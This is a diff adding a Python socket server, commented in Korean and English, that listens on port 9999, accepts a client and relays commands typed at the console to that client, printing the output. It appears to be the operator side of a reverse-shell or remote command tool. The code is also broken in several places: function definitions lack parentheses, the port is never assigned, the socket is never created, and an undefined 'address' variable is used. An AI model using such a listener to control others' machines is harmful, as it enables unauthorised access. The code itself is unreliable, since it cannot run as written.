@@ -16,7 +16,7 @@
 import socket
 import sys
 
-# 소켓 생성 (creating socket)
+# 소켓 생성(creating socket)
 
 def create_socket:
     try:
@@ -27,7 +27,49 @@ def create_socket:
         port 9999
         s = socket.socket
     except socket.error as error_msg:
-        print ("소켓 생성 에러 / Error has occured while creating socket." + str(error_msg))
+        print("소켓 생성 에러 / Error has occured while creating socket." + str(error_msg))
 
 # 소켓 바인딩 및 클라이언트 연결 대기(Binding socket and waiting for the connection of client)
 def bind_socket:
+    try:
+        global host
+        global port
+        global s
+        print("소켓을 포트에 바인딩하는 중 / Binding socket to the port" + str(port))
+        s.bind((host, port))
+        s.listen(5)
+    except socket.error as error_msg:
+        print("소켓 바인딩 에러 / Error has occured while binding socket" + str(error_msg))
+        print(/n)
+        print("재시도 중... / Retrying...")
+        bind_socket()
+
+# 클라이언트와 연결(Establishing a connection with client)
+def accept_socket():
+    connection, accept = s.accept()
+    print("연결 성공 / Connection successfully established")
+    print("IP : " + address[0])
+    print("Port : " + address[1])
+    send_command(connection)
+    connection.close()
+
+# 명령 전송(Sending commands)
+def send_command(connection):
+    while(True):
+        cmd = input()
+        if cmd == 'quit':
+            connection.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            connection.send(str.encode(cmd))
+            response_client = str(connection.recv(2048), "utf-8")
+            print(response_client, end="")
+
+# 메인 함수(Main)
+def main():
+    create_socket()
+    bind_socket()
+    accept_socket()
+
+main()
